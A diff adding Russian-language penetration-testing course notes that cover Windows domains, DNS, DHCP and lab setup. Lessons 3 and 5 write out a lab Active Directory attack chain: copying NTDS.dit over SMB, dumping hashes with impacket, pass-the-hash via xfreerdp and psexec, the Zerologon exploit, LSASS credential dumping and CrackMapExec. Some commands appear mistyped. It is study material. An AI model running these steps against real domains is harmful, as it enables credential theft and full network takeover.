@@ -1,0 +1,194 @@
+Microsoft активно развивает облачные сервисы
+
+Workgroup - рабочая среда по умолчанию, для удобной совместной работы в локальной сети
+
+домен - структура из хостов и комутаторов
+
+Active Directory - хранилище объектов (принтеров, девайсов)
+
+DNS - сервис, который сопоставляет ip адреса и буквенно-цифренные адреса
+
+169.254.0.0 - 169.254.255.255 диапазон адресов, которые windows присваивает себе при отсутствии dhcp сервера
+APIPA - два компа могут общаться без помощи dhcp
+
+
+Global Catalog - сервис, который отслеживает все атрибуты
+
+
+VMvare:
+1) Typical
+2) Install operating system later
+3) Тип и версия ОС
+4) Имя для машины и место расположения
+5) Размер диска (хранить в одном файле)
+6) Customize Hardware - number of processors (установить 1), number of cores (установить 2)
+6.1) В CD/DVD выбрать Use ISO
+
+в VMware на втором шаге создания машины НЕ нужно выбирать instaler disc image file
+
+Specify Disk Capacity - дробление диска нужно для работы на старом железе
+
+тонкое провизирование - динамический размер диска
+толстое провизирование - статическое выделение диска
+
+
+
+С установочной флешки windows можно чинить систему или залезнь на машину
+
+VMware -> Edit -> Change settings 
+
+
+Microtic:
+импортируем виртуалку
+добавляем два сетевых интерфейса (NAT и кастомынй LAN)
+
+
+bridge network - виртуалка выходит на один уровень с хостом (роутер видит каждую виртуалку как устройство)
+NAT - все виртуалки 
+Host Only - все виртуалки конектятся только к хосту
+
+
+WinBox -программа для администрирования microtic
+
+
+BIOS - драйвер для загрузки операционной системы
+UEFI - современный аналог BIOS
+
+Книжки на почтиать:
+Таненбаум сети и опреационные сети.
+
+ДЗ
+поставить второй сервак, и винду 10 на вмваре
+
+
+
+Занятие 2
+
+NTDS.DIT - база данных, содержащая много полезного о виндовой инфраструктуре 
+кража файла == полная компрометация инфраструктуры
+
+lsass.exe - процесс отвечающий за аутентификацию 
+
+
+панель управления -> система -> имя устройства сметить
+
+важные группы:
+enterprise admin
+domain admin
+everyone
+
+
+дз
+создать organisational unit 
+создать резервный домен-контроллер на втором серваке
+переделать скрипт 
+
+
+
+Занятие 3
+
+Существуют разные типы пентеста
+как с нуля, так и по желаемому вектору
+
+Протокол LM и NTLM можно забрутить
+
+в винде smb работает по умолчанию всегда!
+
+скопировать дамп с винды на кали по smb протоколу
+smbclient -L 192.168.0.200 -U hackeru.local/administrator
+smbclient '\\192.168.0.200\C$' -U hackeru.local/administrator 
+cd backupntds\
+mask ""
+recurse ON
+prompt OFF
+lcd /home/user/Downloads/
+mget *
+
+
+утилита для выкачки кредов из бэкапа
+sudo apt update
+sudo apt install python3-pip
+cd impacket
+sudo pip install .
+sudo systemctl restart networking.service
+
+python3 impacket/examples/secretdump.py
+python3 -ntds /Active\ Directory/ntds.dit -system /registry/SYSTEM LOCAL
+
+
+xfreerdp /d:hackeru.local /u:Administrator /v:192.168.0.200 /pth:05df2fd1109e3d3b60f110965f6af128 - RDP через терминал
+
+
+/usr/share/wordlists - папка со словарями паролей в кали
+
+
+
+занятие 4
+DORA (процесс получания адреса через dhcp)
+Discover - кто dhcp сервер???
+Offer - это я. У меня есть свободный айпишник, хочешь?
+Request - хочу!
+Acknowledge - ок, я его зарезервирую его для тебя
+Verification - есть ли еще у кого-нибудь такой же адрес??? нет, отлично, можешь работать 
+DHCP Lease - очистка выделенного айпишника через некоторое время при отстутствии живого хоста
+
+ipconfig /release - сбросить адрес
+ipconfig /renew - поменять адрес
+
+если сбить время в компании, то актуальные мтоды аутентификации не будут работать и админам придется использовать старые
+
+
+все доменные адреса читаются справа на лево и начинаются с точки
+lms.hackeru.pro.
+. 	- root level
+.pro 	- top level
+hackeru	- dns
+
+forward nds - есть имя хотим айпи
+reverse dns - есть айпи хотим все имена
+
+записи домена
+SOA - идентификатор днс зоны
+A - ipv4
+AAAA - ipv6
+MX - mail
+
+
+занятие 5
+чекать уязвимости - очень важно перед пентестом
+exploits.db
+attack.mitre.org - основные инструментыи методы по взлому, которые успешно использовались
+
+подключившись к роутеру кабелем можно через dns запрос получить доменное имя
+через доменное имя можно подключиться к файловой шаре
+nmap -O 	// чекнуть ось
+nmap -sV	// чекунть версию софта\
+
+
+бэкап VMWare: диски это .vmdk
+
+windows defender работает не хуже обычного антивируса против большинства нетаргетированных атак
+
+
+шелл на винду после выкачки паролей:
+git clone https://github.com/risksense/zerologon
+python3 set_empty_pw.py hackeru.local 192.168.0.200
+python3 set_empty_pw.py dc1 192.168.0.200
+secretsdump.py -hashes :31d6cfe0d16ae931b73c59d
+psexec.py hackeru/admpetr@192.168.0.200 -hashes aad3b435b51404eeaad3b435b51404ee:05df2fd1109e3d3b60f110965f6af128
+
+
+mimikatz ворует креды авторизованных пользователей
+
+pypykatz lsa minidump lsass.DMP - выкачка кердов из дампа lsaas.DMP (делается через панель управления)
+
+
+
+
+CrackMapExec
+установка
+apt-get install -y libssl-dev libffi-dev python-dev build-essential
+pip install crackmapexec
+
+Интересная иформация о хостах
+sudo crackmapexec smb <хост/файл со списком хостов>
